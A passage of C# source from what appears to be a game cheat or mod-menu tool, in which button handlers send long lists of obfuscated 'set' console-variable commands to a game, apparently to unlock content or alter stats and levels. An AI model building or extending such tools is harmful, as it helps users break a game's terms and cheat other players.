            this.Cbuf("set TNOQPMNNT 1");
            this.Cbuf("set LRSRKSSTTK 1");
            this.Cbuf("set MQMRPPKMK 1");
            this.Cbuf("set NSNLRONNTR 1");
            this.Cbuf("set MRKOMSNLRK 1");
            this.Cbuf("set NRMNMOOLSM 1");
            this.Cbuf("set NQSTORNSRO 1");
            this.Cbuf("set LPPLOPRQOO 1");
            this.Cbuf("set MPNKRKSONP 1");
            this.Cbuf("set LLKTPRPTMO 1");
            this.Cbuf("set LQTOLLKQSS 1");
            this.Cbuf("set NNRQTOQSSP 1");
            this.Cbuf("set LTQRTPPKKS 1");
            this.Cbuf("set MKNMNRSQRO 1");
            this.Cbuf("set NNOOPSNPRM 1");
            this.Cbuf("set NMPNSQNNRQ 1");
            this.Cbuf("set OKMSLSMRNQ 1");
            this.Cbuf("set LSQMOSORKS 1");
            this.Cbuf("set MOMKSMKTOQ 1");
            this.Cbuf("set NPTKMLRPLQ 1");
            this.Cbuf("set NRKONTQOLL 1");
            this.Cbuf("set LSTLRKKORT 1");
            this.Cbuf("set NLOMTKROPP 1");
            this.Cbuf("set MSORMTOPKQ 1");
            this.Cbuf("set NTOQQKTRPL 1");
            this.Cbuf("set LLRTNMKLTL 1");
            this.Cbuf("set OKNMQLTKLP 1");
            this.Cbuf("set NQKRRQQNQR 1");
            this.Cbuf("set LMQNMORNRQ 1");
            this.Cbuf("set NSLPPMQKQM 1");
            this.Cbuf("set NLKQPLPLQK 1");
            this.Cbuf("set QOTNQOSRN 1");
            this.Cbuf("set MSKSNROSLL 1");
            this.Cbuf("set LSQNRLMKST 1");
            this.Cbuf("set SPOPPKOTP 1");
            this.Cbuf("set LPRRLSSTLP 1");
            this.Cbuf("set OKPMLLOPSK 1");
            this.Cbuf("set NKKONQKNL 1");
            this.Cbuf("set NLOPLSNPQN 1");
            this.Cbuf("set MKRKLLSKSP 1");
            this.Cbuf("set MQRQOLKOTK 1");
            this.Cbuf("set MOKSKKQRLK 1");
            this.Cbuf("set MQTOPKPMRS 1");
            this.Cbuf("set MMQLPLSNOM 1");
            this.Cbuf("set NRONMTPKML 1");
            this.Cbuf("set MPQSMOPRQK 1");
            this.Cbuf("set SKLSORKTK 1");
            this.Cbuf("set LTOQKNQLNP 1");
            this.Cbuf("set LNTOLMQMOQ 1");
            this.Cbuf("set LKSQOLNKLP 1");
            this.Cbuf("set LMMRONPQMO 1");
            this.Cbuf("set LORQPPPMT 1");
            this.Cbuf("set LSPTSOQPPT 1");
            this.Cbuf("set NPKSLQQPMP 1");
            this.Cbuf("set LSSPPSTLQ 1");
            this.Cbuf("set LSOLLKOPQT 1");
            this.Cbuf("set  NRTSOTKTOS 1");
            this.Cbuf("set NMKTMRRMKN 1");
            this.Cbuf("set OROLLTLOO 1");
            this.Cbuf("set MNNMKSKTR 1");
            this.Cbuf("set NOPMMKMQTP 1");
            this.Cbuf("set LOTTMONMPO 1");
            this.Cbuf("set MRNSTPNLPS 1");
            this.Cbuf("set LQKTNLONLP 1");
            this.Cbuf("set LOMSTMNPRR 1");
            this.Cbuf("set NOPLKRPKQL 1");
            this.Cbuf("set MRRPNNKKPO 1");
            this.Cbuf("set LKQKPMMRLK 1");
            this.Cbuf("set NKSTOOTSMO 1");
            this.Cbuf("set MSROMLONNT 1");
            this.Cbuf("set TORMQRSOS 1");
            this.Cbuf("set LNORNRSRLR 1");
            this.Cbuf("set LROKLTPMOM 1");
            this.Cbuf("set NNMMRMNMNQ 1");
            this.Cbuf("set NQTSMTPTMS 1");
            this.Cbuf("set NQROMTQPMT 1");
            this.Cbuf("set LMKMRSPR 1");
            this.Cbuf("set  LPOOMOLLRQ 1");
            this.Cbuf("set LNTOKPTKS 1");
            this.Cbuf("set NRTLNOPOSM 1");
            this.Cbuf("set OKPQTKQLSO 1");
            this.Cbuf("set TPTKKSNQ 1");
            this.Cbuf("set LPRKRTSPQT 1");
            this.Cbuf("set OKLLMNRTP 1");
            this.Cbuf("set NPSQPOMPLP 1");
            this.Cbuf("set NQTKKMTSKL 1");
            this.Cbuf("set LSORRMTOPP 1");
            this.Cbuf("set MTNKKKTTRR 1");
            this.Cbuf("set NTKSMOLO 1");
            this.Cbuf("set NRTOORMRKR 1");
            this.Cbuf("set LTPLSOTTSR 1");
            this.Cbuf("set LNKTTMTOMR 1");
            this.Cbuf("set OKKNPPMMML 1");
            this.Cbuf("set LPTKTQORTR 1");
            this.Cbuf("set NQOKPOKKML 1");
            this.Cbuf("set NPOLQSQMNO 1");
            this.Cbuf("set LSSRRSMNMR 1");
            this.Cbuf("set MLQNQTRRTK 1");
            this.Cbuf("set LNNNKNLPKP 1");
            this.Cbuf("set PPMTTRNQM 1");
            this.Cbuf("set NKNMQRQMM 1");
            this.Cbuf("set NRPOLLOOLL 1");
            this.Cbuf("set NKORSMKORK 1");
        }

        private void metroButton4_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set EDFEDGHEH 1");
            this.Cbuf("set CDABGAAAEI 1");
            this.Cbuf("set GGHCHFBAD 1");
            this.Cbuf("set FBIBDEIDB 1");
            this.Cbuf("set DEHIAGCHBD 1");
            this.Cbuf("set IICEFCICE 1");
            this.Cbuf("set JDBHAIFAB 1");
            this.Cbuf("set CJAJGICGJB 1");
            this.Cbuf("set DIIHDHICFJ 1");
            this.Cbuf("set FGEJHEAAB 1");
            this.Cbuf("set DHJCBAAHII 1");
            this.Cbuf("set EBCFFGFAGC 1");
            this.Cbuf("set JCGCHDEIH 1");
            this.Cbuf("set  FBFGBEC 1");
            this.Cbuf("set CCHJBFADHF 1");
            this.Cbuf("set GADICIDED 1");
            this.Cbuf("set DEBHJBICBJ 1");
            this.Cbuf("set  EDJIEDJ 1");
            this.Cbuf("set BBBHAJHHEJ 1");
            this.Cbuf("set BEHHIDIBII 1");
            this.Cbuf("set DJHDFDDCAD 1");
            this.Cbuf("set DEIJHDGBJF 1");
            this.Cbuf("set CBEGGIIBGE 1");
            this.Cbuf("set BCGAHIHIDE 1");
            this.Cbuf("set CGJCACCIDH 1");
            this.Cbuf("set DGCCABADEF 1");
            this.Cbuf("set CIJEAEBJJ 1");
            this.Cbuf("set DEEAEDDFCA 1");
            this.Cbuf("set CDIJCFCIHC 1");
            this.Cbuf("set CDGBFEJJGE 1");
            this.Cbuf("set CHFFDAHDIB 1");
            this.Cbuf("set DIFGFDHIF 1");
            this.Cbuf("set DCFCIFABGH 1");
        }

        private void metroButton21_Click_1(object sender, EventArgs e)
        {

        }

        private void metroButton11_Click_1(object sender, EventArgs e)
        {
           
           
           
            this.Cbuf("set NOSLSQTPMK 1");
            this.Cbuf("set SLKNNQNQR 1");
            this.Cbuf("set NKNMQSOMNK 1");
            this.Cbuf("set MPKTSNOLSO 1");
            this.Cbuf("set MRRMSMMLML 1");
            this.Cbuf("set LNLNSSNKQ 1");
            this.Cbuf("set MSPSNLMPLP 1");
            this.Cbuf("set SROMPSLNM 1");
            this.Cbuf("set SSRQTKMLQ 1");
            this.Cbuf("set RNRNSRTNQ 1");
            this.Cbuf("set QNPTOQOPL 1");
            this.Cbuf("set MKKKSTPNQL 1");
            this.Cbuf("set LRONQNKRKM 1");
            this.Cbuf("set OPONKOMKQ 1");
            this.Cbuf("set LRKPTLNQTT 1");
            this.Cbuf("set LORNQMSLNM 1");
            this.Cbuf("set MPTLKKKQNT 1");
            this.Cbuf("set NRLKQRRMKK 1");
            this.Cbuf("set LTMMNMRLTP 1");
            this.Cbuf("set LMPPLNSRK 1");
            this.Cbuf("set MLTSLNNNKN 1");
            this.Cbuf("set LSRMTRQKR 1");
            this.Cbuf("set NNTRPQMPPK 1");
            this.Cbuf("set NRKOOPRLTN 1");
            this.Cbuf("set QSOONMKK 1");
            this.Cbuf("set OLQPPMRQKP 1");
            this.Cbuf("set LPTRTLMOLK 1");
            this.Cbuf("set MNRKSPPPQL 1");
            this.Cbuf("set NPOPOROTQM 1");
            this.Cbuf("set NLTNQNSMQK 1");
            this.Cbuf("set NOTKSOLRMO 1");
            this.Cbuf("set NQPLOSRSTP 1");
            this.Cbuf("set NQPKQKPTOQ 1");
            this.Cbuf("set LRTKSQRKLR 1");
            this.Cbuf("set OKQQPKRLTN 1");
            this.Cbuf("set NPMLNMNRMT 1");
            this.Cbuf("set LQSQKPKOSQ 1");
            this.Cbuf("set MKKNSMLKPR 1");
            this.Cbuf("set LQSPQSNQSN 1");
            this.Cbuf("set LRTQKNLLMO 1");
            this.Cbuf("set NSMNNLPSPM 1");
            this.Cbuf("set NKMQMOKNRP 1");
            this.Cbuf("set NPPQOLPPO 1");
            this.Cbuf("set NTMRRKSKPQ 1");
            this.Cbuf("set MNROTSKL 1");

        }

        private void metroButton12_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set NNPPKLQOSN 1");
            this.Cbuf("set NPKTRSPLNN 1");
            this.Cbuf("set TQRNTTMSL 1");
            this.Cbuf("set LQMNOKSPLN 1");
            this.Cbuf("set LSTSLQMPQP 1");
            this.Cbuf("set LPTQKMPTNP 1");
            this.Cbuf("set LKOKMNPSLM 1");
            this.Cbuf("set LOKSLQPSKT 1");
            this.Cbuf("set NQSOLTPSSM 1");
            this.Cbuf("set MLQRKOONNM 1");
            this.Cbuf("set LPTSRPTOQQ 1");
            this.Cbuf("set MLNSOPOTNQ 1");
            this.Cbuf("set LLRLMRNNNM 1");
            this.Cbuf("set  MMLPKNNRMM 1");
            this.Cbuf("set LKMRLPORSK 1");
            this.Cbuf("set LNSMNRRQN 1");
            this.Cbuf("set PMRTOLLTK 1");
            this.Cbuf("set  NMSNLMKKQS 1");
            this.Cbuf("set MQNLOSMSQR 1");
            this.Cbuf("set LTLNQLSSK 1");
            this.Cbuf("set NTKOQLQNMS 1");
            this.Cbuf("set NSSKMSRTMN 1");
        }

        private void metroButton14_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LPKNOPTMLP 1");
            this.Cbuf("set OKPORRORMM 1");
            this.Cbuf("set MPKLTKMKTL 1");
            this.Cbuf("set OMPKROKQPL 1");
            this.Cbuf("set MPMTRSQLLO 1");
            this.Cbuf("set MMOOMQPMTP 1");
            this.Cbuf("set NKRLMNTNRS 1");
            this.Cbuf("set OSNKSLRMS 1");
            this.Cbuf("set MRKSTPMLT 1");
            this.Cbuf("set MNRNRKMQKK 1");
            this.Cbuf("set NNQSMOKTKM  1");
            this.Cbuf("set MQQOKSOPL 1");
            this.Cbuf("set LKSKPKTOON 1");
            this.Cbuf("set NNOQMLNSMP 1");
            this.Cbuf("set NQOMTKMNPT 1");
            this.Cbuf("set MOOOOTKPTL 1");
            this.Cbuf("set LQPKMLTOQM 1");
            this.Cbuf("set OLMOTLRSPK 1");
            this.Cbuf("set NNPMRQSQN 1");
            this.Cbuf("set PMTLOTQQS 1");
            this.Cbuf("set NLOTPSPSOQ 1");
            this.Cbuf("set LKLOMSPQSR 1");
            this.Cbuf("set OSNMNPLRR 1");
            this.Cbuf("set LPRTSKKKLL 1");
            this.Cbuf("set NSKOMKOSLO 1");
            this.Cbuf("set NNNSQLQO 1");
            this.Cbuf("set LTLMRRLTR 1");
            this.Cbuf("set MNLPOPMMSK 1");
            this.Cbuf("set LSPQSSPSOL 1");
            this.Cbuf("set NQRLNKMTSL 1");
            this.Cbuf("set OMKLOKONRK 1");
            this.Cbuf("set NNOTOOSNQR 1");
            this.Cbuf("set MNQKMLMMM 1");
            this.Cbuf("set NRMMRSMNPS 1");
            this.Cbuf("set LQNKRLQTLM 1");
            this.Cbuf("set RPNQOQSOS 1");
            this.Cbuf("set OMRLPMMPRL 1");
            this.Cbuf("set OMNLSQLMMP 1");
            this.Cbuf("set MRTTLKLTKO 1");
        }

        private void metroButton16_Click_1(object sender, EventArgs e)
        {

        }

        private void metroButton16_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set NLSTMSNRKN 1");
            this.Cbuf("set LRNMMQMTPK 1");
            this.Cbuf("set MTORSRMLSQ 1");
            this.Cbuf("set MKSNRSOQSS 1");
            this.Cbuf("set LSPSKLPNQT 1");
            this.Cbuf("set NNTRQOMLSQ 1");
            this.Cbuf("set MTRLRMPONT 1");
            this.Cbuf("set NRKKKQNQQP 1");
            this.Cbuf("set MNTMKQRSTQ 1");
            this.Cbuf("set LRKORRLSSM 1");
            this.Cbuf("set LPKRQLLLNQ 1");
            this.Cbuf("set NOMPNRSPRL 1");
            this.Cbuf("set LNKPLSSRQ 1");
            this.Cbuf("set  LNRQKOQLNN 1");
            this.Cbuf("set  NLMSQOPNMK 1");
            this.Cbuf("set LNSMNRRQN 1");
            this.Cbuf("set PMRTOLLTK 1");
            this.Cbuf("set  NKOOQPNSKM 1");
            this.Cbuf("set LMTKOLOLTK 1");
            this.Cbuf("set MSSMLKNMRT 1");
            this.Cbuf("set LOOTSOTKLS 1");
            this.Cbuf("set MOSNKSLTKM 1");
            this.Cbuf("set MNRLLKTLPT 1");
            this.Cbuf("set NLMOPNQOTT 1");
            this.Cbuf("set NRNLOOTRN 1");
            this.Cbuf("set MPTMQQNLNT 1");
            this.Cbuf("set MNPLOKRMON 1");
            this.Cbuf("set TPQRKMRLN 1");
            this.Cbuf("set MLRKKOMSNT 1");
            this.Cbuf("set MSSTOMNNMR 1");
            this.Cbuf("set LMKLPKTQOO 1");
            this.Cbuf("set SPTSNKQSN 1");
            this.Cbuf("set LPKOMPKSPL 1");
            this.Cbuf("set MTQQTNNTMM 1");
            this.Cbuf("set OMMSLPNSTR 1");
            this.Cbuf("set LOQQOSNQKN 1");
            this.Cbuf("set LSLKTTRKPQ 1");
            this.Cbuf("set PKMLMMTSN 1");
            this.Cbuf("set MLMKTRTSPL 1");
            this.Cbuf("set LPPNKPRPRP 1");
            this.Cbuf("set ORNSLMTMT 1");
            this.Cbuf("set LORLPQNNTN 1");
            this.Cbuf("set NSTTKMQTRO 1");
            this.Cbuf("set NQPKQNMQSR 1");
            this.Cbuf("set NKSSSTTRPN 1");
            this.Cbuf("set MRMSRLKSPT 1");
            this.Cbuf("set LROKTOQOKQ 1");
            this.Cbuf("set LNMNLSOMQS 1");
            this.Cbuf("set MLNLKSKNQN 1");
            this.Cbuf("set TPKMQLMPP 1");
            this.Cbuf("set RNNNLLQMN 1");
            this.Cbuf("set NRLPPKQTMN 1");
            this.Cbuf("set MKQRLRTRNR 1");
            this.Cbuf("set LTNLRPSNSM 1");
            this.Cbuf("set TMRRKNKQ 1");
            this.Cbuf("set LQQNTKTLQK 1");
            this.Cbuf("set NPQPKPKRTL 1");
            this.Cbuf("set NOKMRLMRPK 1");
            this.Cbuf("set LNTTQPOKMP 1");
            this.Cbuf("set NQTLNRKLNQ 1");
            this.Cbuf("set LQMMKMTNTT 1");
            this.Cbuf("set NOPKOOSRTS 1");
            this.Cbuf("set NKPLOQLPLT 1");
            this.Cbuf("set MPNNSLPPNP 1");
            this.Cbuf("set NNPKSTLOMR 1");
            this.Cbuf("set MSNTQLOTTL 1");
            this.Cbuf("set TMLNPLKSS 1");
            this.Cbuf("set MLKNNKNTLP 1");
            this.Cbuf("set MPLSPRQTNR 1");
            this.Cbuf("set LPPTMKTTSL 1");
            this.Cbuf("set MNORNLMQTS 1");
            this.Cbuf("set MNMTKTRPPP 1");
            this.Cbuf("set MSLLOLLTOO 1");
            this.Cbuf("set NRSSOSMOP 1");
            this.Cbuf("set NPTOQSNLPS 1");
            this.Cbuf("set TMMMQMMT 1");
            this.Cbuf("set NKNLTNNMMS 1");
            this.Cbuf("set NQROPRPPSO 1");
            this.Cbuf("set MKQKQLSOKS 1");
            this.Cbuf("set MKQKQLSOKS 1");
            this.Cbuf("set NORTQPSRSM 1");
            this.Cbuf("set MKNLOTLKLO 1");
            this.Cbuf("set LOMTQPONKO 1");
       
        }

        private void metroButton21_Click_2(object sender, EventArgs e)
        {
          
            this.Cbuf("set NSLSMQTMSS 1");
            this.Cbuf("set LPNTMKLSSR 1");
            this.Cbuf("set MKKPMNNPQK 1");
            this.Cbuf("set MLOMMRLKRL 1");
            this.Cbuf("set NOTMMNOSQO 1");
            this.Cbuf("set LOOSQMLOLN 1");
            this.Cbuf("set TKPMPLQQ 1");
            this.Cbuf("set MKTLKSMQLP 1");
            this.Cbuf("set MRSTSRLQKL 1");
            this.Cbuf("set LLQPMRNTP 1");
            this.Cbuf("set NNOKMOPPPP 1");
            this.Cbuf("set OLSTQTTPLO 1");
            this.Cbuf("set NOTTPOPTSQ 1");
            this.Cbuf("set MMKKTLQSPK 1");
            this.Cbuf("set MSKSKSPQRM 1");
            this.Cbuf("set LTMQPKTPQQ 1");
            this.Cbuf("set LMSRLQMQTK 1");
            this.Cbuf("set NPLTQSPNRL 1");
            this.Cbuf("set MLQKLMSRST 1");
            this.Cbuf("set MNNSLRRMNL 1");
            this.Cbuf("set NPLMROSQKM 1");
            this.Cbuf("set LLOLKOLPMN 1");
            this.Cbuf("set LLQLKSMMTO 1");
            this.Cbuf("set MLQMNPQNOP 1");
            this.Cbuf("set MPQLRTKSPM 1");
            this.Cbuf("set MNQRLPRQOP 1");
            this.Cbuf("set OLPKRPRLPM 1");
            this.Cbuf("set TMQTSMRPS 1");
            this.Cbuf("set LTTOPRNTON 1");
            this.Cbuf("set LMLLSTRMSQ 1");
            this.Cbuf("set RORQSKTLT 1");
            this.Cbuf("set OKTLSQMTOP 1");
            this.Cbuf("set NTNLSSTMQK 1");
            this.Cbuf("set PORQNRQP 1");
            this.Cbuf("set LPNRRKQQQO 1");
            this.Cbuf("set MMPRQRSPOP 1");
            this.Cbuf("set NLQKPRSMLT 1");
            this.Cbuf("set NOPLNKORSM 1");
            this.Cbuf("set LKRKKMPKQN 1");
            this.Cbuf("set MMLKKNQTRS 1");
            this.Cbuf("set TKPTLPSNR 1");
            this.Cbuf("set LSLRLKSNM 1");
            this.Cbuf("set MTTKNLQQQP 1");
            this.Cbuf("set LMRRQQOKO 1");
            this.Cbuf("set LOLMPNLQLK 1");
            this.Cbuf("set LNNTTKNOPT 1");
            this.Cbuf("set MROQSKORRK 1");

        }

        private void metroButton17_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set SROLTPQLK 1");
        }

        private void metroButton10_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set MOKQNLLMKN 39");
        }

        private void metroButton26_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set MOKQNLLMKN 69");
        }

        private void metroButton23_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set MQNMPKRKMQ 0");
        }

        private void metroButton25_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LRMSSOOQQP 1");
        }

        private void metroButton24_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set  NRKSORMLRM -800");
        }

        private void metroButton27_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set NNPPKLQOSN 1");
        }

        private void metroButton28_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set  NRKSORMLRM 800");
        }

        private void metroButton29_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set NKTNRLTOSO 1");
            this.Cbuf("set MTTRPNMPRP 1");
            this.Cbuf("set OLKNTQKTPP 1");
            this.Cbuf("set SNTTNKSRO 1");
            this.Cbuf("set OLLPNSOSNN 1");
            this.Cbuf("set NRRNOTRMOP 1");
            this.Cbuf("set NNKSOPNQPS 1");
            this.Cbuf("set NLQPKTLNNT 1");
            this.Cbuf("set NMNPSRKPPP 1");
            this.Cbuf("set MNNTMPMOLK 1");
            this.Cbuf("set MMNQKTMMQS 1");
            this.Cbuf("set NORRQNNNOP 1");
            this.Cbuf("set LPSOKQSSRL 1");
            this.Cbuf("set MPLTQKNSMM 1");
            this.Cbuf("set NROLSNKS 1");
            this.Cbuf("set NLOQPLMLKR 1");
            this.Cbuf("set MNRTKTQMLS 1");
            this.Cbuf("set RMTPOKQP 1");
            this.Cbuf("set LNSMSSTTSK 1");
            this.Cbuf("set NORMPNKNKQ 1");
            this.Cbuf("set TKRPRPOSQ 1");
            this.Cbuf("set NMTRNKQNOP 1");
            this.Cbuf("set OLRSKMOQLR 1");
            this.Cbuf("set LOPTQONSTM 1");
            this.Cbuf("set NSRRPSPKRN 1");
            this.Cbuf("set NRTPTSNRNK 1");
            this.Cbuf("set MOKTSOLQMP 1");
            this.Cbuf("set NNNMLOLKTK 1");
            this.Cbuf("set LMPTPMLQPR 1");
        }

        private void metroButton30_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LKOKTLQSPT 1");
            this.Cbuf("set QQKNMNOON 1");
            this.Cbuf("set MNMOROOOKQ 1");
            this.Cbuf("set MSNSNRSNNR 1");
            this.Cbuf("set MQNKONMLSM 1");
            this.Cbuf("set RQSTMSQLN 1");
            this.Cbuf("set NTKPOOLNLM 1");
            this.Cbuf("set LNQTKTLKOS 1");
            this.Cbuf("set NKPPMRTRRK 1");
            this.Cbuf("set LLKLMQLMPT 1");
            this.Cbuf("set NMOQRNSLTM 1");
            this.Cbuf("set MNPOQRNMTO 1");
            this.Cbuf("set MROTTSMSRM 1");
            this.Cbuf("set OKSLQQOOOK 1");
            this.Cbuf("set PTOSLOTSN 1");
            this.Cbuf("set NKOPLQKLQT 1");
            this.Cbuf("set RRTLRKKTT 1");
            this.Cbuf("set MQNLMKNQS 1");
            this.Cbuf("set CEBAGDAEJJ 1");
            this.Cbuf("set CBGJCDIHCE 1");
            this.Cbuf("set BFCIGBHEFD 1");
            this.Cbuf("set BJJBBCJGEJ 1");
            this.Cbuf("set BJJBBCJGEJ 1");
            this.Cbuf("set BFBFCFCDJD 1");
            this.Cbuf("set BFCEGDJIEI 1");
            this.Cbuf("set GFFECBCCF 1");
            this.Cbuf("set CECBCJDIAG 1");
            this.Cbuf("set BFFBGAJGD 1");
            this.Cbuf("set IIGEGHFJC 1");
            this.Cbuf("set EBFGJFIAJI 1");
            this.Cbuf("set BBGDDCBFHA 1");
            this.Cbuf("set BFHCAIIDA 1");
            this.Cbuf("set DJAJIHFFAG 1");
            this.Cbuf("set GJADICBJC 1");
            this.Cbuf("set DADFFBJADD 1");
            this.Cbuf("set HCDABCEFB 1");
            this.Cbuf("set EAABFJFCAG 1");
            this.Cbuf("set ECHJFCGHJI 1");
            this.Cbuf("set CICAGFJFEH 1");
            this.Cbuf("set DGADFJACCI 1");
            this.Cbuf("set DJJHBDCEAB 1");
            this.Cbuf("set DEDCDIFJHG 1");
            this.Cbuf("set JJEHAEBDF 1");
            this.Cbuf("set DBEBGEAJHJ 1");
            this.Cbuf("set DCEBHAJGCJ 1");
            this.Cbuf("set EBBAIAEICC 1");
            this.Cbuf("set DEHABCCECE 1");
            this.Cbuf("set BDEHAEGHAF 1");
            this.Cbuf("set DFIJDJFIFD 1");
            this.Cbuf("set IICIFEEDC 1");
            this.Cbuf("set NTMRRKSKPQ 1");
            this.Cbuf("set DHEGHJJJHI 1");
        }

        private void metroButton31_Click(object sender, EventArgs e)
        {
            this.Cbuf("set NOTLNTRMTL 1");
            this.Cbuf("set NMKNORNKMM 1");
            this.Cbuf("set LQNRMLNKLK 1");
            this.Cbuf("set RMKORNSTL 1");
            this.Cbuf("set MKSQKQRNKT 1");
            this.Cbuf("set MPPKMQPPOT 1");
            this.Cbuf("set MNTSSMTOMR 1");
            this.Cbuf("set MORKQLLMNM 1");
            this.Cbuf("set LQSSNPQOMO 1");
            this.Cbuf("set GIDCAADHB 1");
            this.Cbuf("set JBAEHFHCA 1");
            this.Cbuf("set DEEGIBCDJG 1");
            this.Cbuf("set BEICGBEEHD 1");
            this.Cbuf("set DAFFBECEBF 1");
            this.Cbuf("set HJHDJDCBF 1");
            this.Cbuf("set CBCGDIGGHB 1");
            this.Cbuf("set MLSNKQTKQK 1");
            this.Cbuf("set OLSLLQSNS 1");
            this.Cbuf("set OLLPQNLOPO 1");
            this.Cbuf("set MNOQRLLRTQ 1");
            this.Cbuf("set NOTKKKNTQN 1");
            this.Cbuf("set NNTLNTPRNL 1");
            this.Cbuf("set NNTTTQSRN 1");
            this.Cbuf("set LPNQPNMOQO 1");
            this.Cbuf("set LQSSTRMLQN 1");
            this.Cbuf("set MOKOTLQNQK 1");
            this.Cbuf("set MMKTLNPQTS 1");
        }

        private void metroButton10_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LKRMTKNKRQ 1");
            this.Cbuf("set NLKPRMLKRQ 1");
            this.Cbuf("set NQOSLTOTO 1");
            this.Cbuf("set MMQPTRQNPS 1");
            this.Cbuf("set NNQSLKNPNP 1");
            this.Cbuf("set MLNLOPPPK 1");
            this.Cbuf("set MPPMSRPRS 1");
            this.Cbuf("set MNMRTKRKLL 1");
            this.Cbuf("set LTLRPLPRQP 1");
            this.Cbuf("set NKNRQKMKLM 1");
            this.Cbuf("set MSQPRTOTPT 1");
            this.Cbuf("set MLNNPLTRR 1");
            this.Cbuf("set NMTRTPRNKR 1");
            this.Cbuf("set  NORPPNOSRN 1");
            this.Cbuf("set  NKTQSKMOSM 1");
            this.Cbuf("set NTKKMSQKMN 1");
            this.Cbuf("set OLMLQMOSRL 1");
            this.Cbuf("set  LOPLPOKTOP 1");
            this.Cbuf("set MSSNLOQPRL 1");
            this.Cbuf("set NNKMTMLORP 1");
            this.Cbuf("set NMTKLSKPPO 1");
            this.Cbuf("set PRKMQROMO 1");
            this.Cbuf("set RSOQLMNPK 1");
            this.Cbuf("set LTKONTMSON 1");
            this.Cbuf("set NTPSRTPSTK 1");
            this.Cbuf("set LMTTLKKRMN 1");
            this.Cbuf("set SKLRTTOON 1");
            this.Cbuf("set QMONTNNM 1");
            this.Cbuf("set NLRLNPOSNR 1");
            this.Cbuf("set LNNTTQMLRN 1");
            this.Cbuf("set LTTRPPQMKT 1");
            this.Cbuf("set QTTLNNLPM 1");
            this.Cbuf("set MQRMRNKPR 1");
            this.Cbuf("set QLNKQKLMO 1");
            this.Cbuf("set OLRKLMKTST 1");
            this.Cbuf("set MNLMMSSLML 1");
            this.Cbuf("set NNPLTOKSR 1");
            this.Cbuf("set OLRTPNKNQN 1");
            this.Cbuf("set OKKSSOKQML 1");
            this.Cbuf("set MOTQKOSKRM 1");
            this.Cbuf("set NOLORMOSTT 1");
            this.Cbuf("set LSRTTOSTTO 1");
            this.Cbuf("set LTQOSONPNM 1");
            this.Cbuf("set PSPSOQSRL 1");
            this.Cbuf("set TSPOOOTSN 1");
            this.Cbuf("set MNOOLPRSQ 1");
            this.Cbuf("set NOTTPKOLQQ 1");
            this.Cbuf("set NRNNSORPTK 1");
        }

        private void metroButton17_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set LNMTSOMSSR 1");
            this.Cbuf("set NNONTTTMTM 1");
            this.Cbuf("set NQMKORNRPR 1");
            this.Cbuf("set LRSQPTMON 1");
            this.Cbuf("set OMSSNSLNQK 1");
            this.Cbuf("set NRRSPTSTTM 1");
            this.Cbuf("set RTMLTLLQT 1");
            this.Cbuf("set SSSPPKPTN 1");
            this.Cbuf("set NMKNSMKMTO 1");
            this.Cbuf("set MPLKOPSSNN 1");
            this.Cbuf("set MQOOLQLLPN 1");
            this.Cbuf("set OLKOOMKSMK 1");
            this.Cbuf("set LRTTMPMQOO 1");
            this.Cbuf("set QRKSSMPR 1");
            this.Cbuf("set NTQKQKNRPQ 1");
            this.Cbuf("set RKTKKSMM 1");
            this.Cbuf("set LOTNRMLLPS 1");
            this.Cbuf("set LRMNSLSMNK 1");
            this.Cbuf("set MNRKKQLQPQ 1");
            this.Cbuf("set RQLRLQTKL 1");
            this.Cbuf("set MSNONNQNNO 1");
            this.Cbuf("set LLLORKNRTO 1");
            this.Cbuf("set OPQLOSSLO 1");
            this.Cbuf("set MLOLLLQNKO 1");
            this.Cbuf("set MLPTTLSRKP 1");
            this.Cbuf("set OMNMPNSLNS 1");
            this.Cbuf("set MLKRMNMOSM 1");
            this.Cbuf("set NOQLNKOT 1");
            this.Cbuf("set MLLRNRMPNP 1");
            this.Cbuf("set MTLOKKQKMN 1");
            this.Cbuf("set MSKPRTTKPK 1");
            this.Cbuf("set MOTRNMTRKS 1");
            this.Cbuf("set STSSSLOQT 1");
            this.Cbuf("set OOSKKKNOP 1");
            this.Cbuf("set NKMOPMMNQP 1");
            this.Cbuf("set NRRMTSLKNT 1");
            this.Cbuf("set NLSOONOQOK 1");
            this.Cbuf("set NOMMOQKSMR 1");
            this.Cbuf("set LLMSOTSQSR 1");
            this.Cbuf("set MOMPTQROTO 1");
            this.Cbuf("set RKMLSNPOQ 1");
            this.Cbuf("set LMSRPLTONR 1");
            this.Cbuf("set NQKMMQKSLQ 1");
            this.Cbuf("set OKRTRKKRMP 1");
            this.Cbuf("set LLRKMOOKPT 1");
            this.Cbuf("set LOONOPPPNR 1");
            this.Cbuf("set LOMLKMNNKS 1");
            this.Cbuf("set MTTNTNMPLL 1");
            this.Cbuf("set LSNLMOQNRT 1");
            this.Cbuf("set NLPOMMTMTM 1");
            this.Cbuf("set NNLSNQRLT 1");
            this.Cbuf("set MSOSMKOSNO 1");
            this.Cbuf("set NNTKMTSPLO 1");
            this.Cbuf("set LRLTNMQOKK 1");
            this.Cbuf("set MONNPPSQPQ 1");
            this.Cbuf("set LPPTLMKOS 1");
            this.Cbuf("set  LPSLTNTSTL 1");
            this.Cbuf("set  MTNNKMQLLR 1");
            this.Cbuf("set LNQOPLRTPK 1");
            this.Cbuf("set LLOSTRPM 1");
            this.Cbuf("set  MKPQSTROLT 1");
        }

        private void metroButton24_Click_2(object sender, EventArgs e)
        {
            this.Cbuf("set OKLSKPOTOP 1");
            this.Cbuf("set STNLLNSMQ 1");
            this.Cbuf("set NTPKMKKQPQ 1");
            this.Cbuf("set MTOMPONOTT 1");
            this.Cbuf("set LOQKPKKSON 1");
            this.Cbuf("set LMMNLSQQNQ 1");
            this.Cbuf("set LRNLPRTKLP 1");
